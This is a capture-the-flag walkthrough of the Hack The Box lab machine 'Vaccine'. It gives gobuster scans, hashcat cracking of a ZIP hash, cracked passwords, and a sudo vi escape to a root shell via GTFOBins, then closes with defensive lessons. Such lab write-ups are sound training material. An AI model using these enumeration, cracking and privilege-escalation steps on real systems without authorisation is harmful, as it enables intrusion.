---
title: HTB CTF - Vaccine
draft: false
tags:
  - discovery
  - privilege-escalation
  - ftp
  - ssh
  - php
  - postgresql
NeedsReview: false
---
> [!summary] Core Concept  
This CTF focuses on enumeration, password cracking, and privilege escalation on a vulnerable system hosted at `megacorp.hbt (10.129.19.59)`.

---

## 🔹 In — Gaining Initial Foothold

### 🧭 Host Mapping
```bash
echo "10.129.19.59 megacorp.hbt" | sudo tee -a /etc/hosts
````

### 📡 Port Scan

```text
PORT     STATE SERVICE
21/tcp   open  ftp  
22/tcp   open  ssh  
80/tcp   open  http 
```

---

## 🔍 Web Enumeration

### Gobuster Dir Scan

```bash
gobuster dir -u http://megacorp.hbt -w Documents/BruteForcing/dsstorewordlist\ \(WebsiteEnum\).txt
```

**Results:**

- `/index.php` (200)
- `/license.txt` (200)
- `/.htaccess`, `/.htpasswd`, `/.htpasswds` (403)
- `/dashboard.php` (302 redirect to `index.php`)

### Session Cookie

```http
Set-Cookie: PHPSESSID=oqbd9hj63idlbh9149blrctlat;
```

### VHost Enumeration

```bash
gobuster vhost -w Documents/BruteForcing/subdomains-top1million-5000.txt -u http://megacorp.hbt
```

**No subdomains discovered**

---

## 🔐 ZIP File Crack

Found `$pkzip$` hash:

```bash
hashcat -m 17220 zip.hash wordlist.txt
```

**Password Cracked:** `741852963`

---

## 🔑 MD5 Password Cracked

Discovered user `admin` MD5 hash:

```
2cb42f8734ea607eefed3b70af13bbd3 → qwerty789
```

---

## 🧾 Web Shell Enumeration

Check `/var/www/html` for PHP or SQL-based credentials.

---

## 🔸 Through — Navigating Internals

### 🔑 SSH Access

Use credentials found from cracked hashes or web file inclusion.

---

## 🧨 Privilege Escalation

### 🔎 Sudo Permissions

```bash
sudo -l
```

**User `postgres` can run:**

```bash
(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

### 🧰 Abuse with GTFOBins

Source: [GTFOBins vi - sudo](https://gtfobins.github.io/gtfobins/vi/#sudo)

Run shell from within `vi`:

```vi
:set shell=/bin/sh
:shell
```

Beautify shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!success]  
> **Root shell obtained — system pwned.**

---

## 🧩 Lessons Learned

- Always validate disabled UI controls server-side.
- Store hashes securely, never MD5 for passwords.
- Restrict sudo permissions — `vi` is extremely abusable.
- Web directory permissions (`.htpasswd`, etc.) should be locked down.

> [!tip]  
> Use [[linPEAS]] or [[pspy]] next time for automated privilege escalation checks.